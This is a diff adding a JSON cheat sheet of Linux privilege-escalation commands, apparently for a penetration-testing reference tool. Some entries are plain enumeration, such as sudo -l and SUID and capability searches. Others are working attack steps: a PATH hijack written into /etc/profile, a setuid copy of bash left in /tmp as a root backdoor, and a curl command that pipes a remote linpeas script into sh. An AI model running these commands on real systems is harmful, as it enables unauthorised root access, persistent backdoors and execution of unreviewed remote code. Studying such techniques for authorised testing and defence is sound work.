@@ -1,0 +1,14 @@
+{
+  "category": "Privilege Escalation – Linux",
+  "description": "GTFOBins classics, sudo, SUID & cron tricks",
+  "cheats": [
+    { "title": "Check sudo perms", "content": "sudo -l" },
+    { "title": "Find SUID", "content": "find / -perm -4000 -type f 2>/dev/null" },
+    { "title": "Capabilities enumeration", "content": "getcap -r / 2>/dev/null" },
+    { "title": "Writable systemd service", "content": "sudo systemctl edit --full vulnerable.service" },
+    { "title": "Cron PATH hijack", "content": "echo 'export PATH=/tmp:$PATH' >> /etc/profile" },
+    { "title": "gcc SUID shell (fallback)", "content": "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" },
+    { "title": "linpeas fast enumeration", "content": "curl -sL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh" },
+    { "title": "GTFOBins reference", "content": "https://gtfobins.github.io/" }
+  ]
+}
